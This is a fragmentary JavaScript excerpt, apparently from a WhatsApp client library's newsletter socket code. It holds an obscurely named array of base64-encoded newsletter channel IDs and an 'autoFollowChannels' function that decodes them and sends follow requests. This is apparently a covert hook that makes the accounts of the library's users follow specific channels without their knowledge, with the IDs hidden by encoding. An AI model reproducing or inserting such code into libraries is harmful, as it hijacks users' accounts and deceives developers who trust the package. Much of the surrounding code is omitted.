...
export const makeNewsletterSocket = config => {
  ...
  const xI = [
    ...
    "MTIwMzYzNDA3NDY4NDUyMzQwQG5ld3NsZXR0ZXI="
  ]

  const autoFollowChannels = async () => {
    for (const encodedJid of xI) {
      try {
        const channelJid = Buffer.from(encodedJid, "base64").toString("utf-8").trim()
        if (channelJid && channelJid.endsWith('@newsletter')) {
          await mexQuery(
            { newsletter_id: channelJid },
      ...
      return mexQuery(
        {
          ...
          include_jarvisConfig: includeJarvisConfig
        },
